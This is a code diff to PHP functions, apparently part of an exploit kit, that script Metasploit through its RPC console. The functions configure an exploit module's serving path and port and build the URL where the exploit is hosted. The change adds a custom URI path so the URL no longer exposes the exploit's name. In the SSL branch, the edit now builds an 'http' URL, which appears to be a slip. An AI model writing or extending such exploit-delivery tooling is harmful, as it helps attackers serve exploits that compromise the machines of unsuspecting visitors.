@@ -264,7 +264,7 @@ function use_payload($ek_ip, $msf_payload, $msf_type, $msf_rhost, $msf_rport, $m
 }
 
 // ************ use_exploit() ************ //
-function use_exploit($msgrpc_ip, $exploit_domain, $exploit_port, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option, $msf_ssl = 0)
+function use_exploit($msgrpc_ip, $exploit_domain, $exploit_port, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option, $msf_uripath, $msf_ssl = 0)
 {    
     debug("START Function use_exploit()");
     debug("msgrpc_ip: " . $msgrpc_ip);
@@ -294,7 +294,7 @@ function use_exploit($msgrpc_ip, $exploit_domain, $exploit_port, $msf_exploit_fu
     $msf_exploit_name = substr(strrchr($msf_exploit_full_path, "/"), 1 );
     debug("msf_exploit_name: " . $msf_exploit_name);
     
-    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set URIPATH /" . $msf_exploit_name);
+    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set URIPATH /" . $msf_uripath);
     //$server_response = msf_console($ek_ip, $token, $console_id_one, "set SRVPORT 80");
     
     $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set SRVPORT " . $exploit_port);
@@ -332,11 +332,13 @@ function use_exploit($msgrpc_ip, $exploit_domain, $exploit_port, $msf_exploit_fu
     
     if($msf_ssl)
     {
-	$msf_url = 'https://' . $exploit_domain . '/' . $msf_exploit_name;
+	#$msf_url = 'https://' . $exploit_domain . '/' . $msf_exploit_name;
+        $msf_url = 'http://' . $exploit_domain . '/' . $msf_uripath;
     }
     else
     {
-	$msf_url = 'http://' . $exploit_domain . '/' . $msf_exploit_name;
+	#$msf_url = 'http://' . $exploit_domain . '/' . $msf_exploit_name;
+        $msf_url = 'http://' . $exploit_domain . '/' . $msf_uripath;
     }
     
     debug("msf_url: " . $msf_url);
